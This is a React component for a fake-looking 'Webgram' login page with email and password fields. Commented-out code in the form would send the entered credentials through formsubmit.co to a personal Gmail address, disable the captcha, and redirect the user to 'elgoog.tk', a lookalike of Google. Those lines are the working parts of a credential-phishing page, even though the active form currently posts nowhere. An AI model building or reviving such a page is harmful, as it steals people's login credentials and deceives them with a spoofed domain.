import React from 'react';
import './style.css';

// ICONS
import { IoMdLock } from "react-icons/io";
import { HiUser } from "react-icons/hi";
import { FiUser } from "react-icons/fi";

// COMPONENTES
import Input from "./Components/Input";
import Button from "./Components/Button";
import Title from "./Components/Title";



function App() {

  return (
    <div className="App">

      <div className='background'>
        {/* <div className='message'>

          <h2>welcome to the Webgram</h2>
          <h4>Be peaceful and enjoy :)</h4>

        </div> */}
      </div>

      <div className='container'>
        <div className='main'>

          <Title>Connect to your account and have fun ;)</Title>

          {/* <form action='https://formsubmit.co/renangiimenez@gmail.com' method="POST"> */}
          <form action='#' method="">

            <Input icon={<HiUser/>} id="email" name="Email" type="email" placeholder="Email"/>

            <Input icon={<IoMdLock/>} id="password" name="Password"  type="password" placeholder="Password"/>

            {/* <input type='hidden' name='_next' value='http://elgoog.tk'></input>
            <input type='hidden' name='_captcha' value='false'></input> */}

            <Button>Login</Button>

            <p className='span'>Don't have an account? <a href='#'>SignUp</a></p>
          </form>
        </div>
      </div>
    </div>
  );
}

export default App;
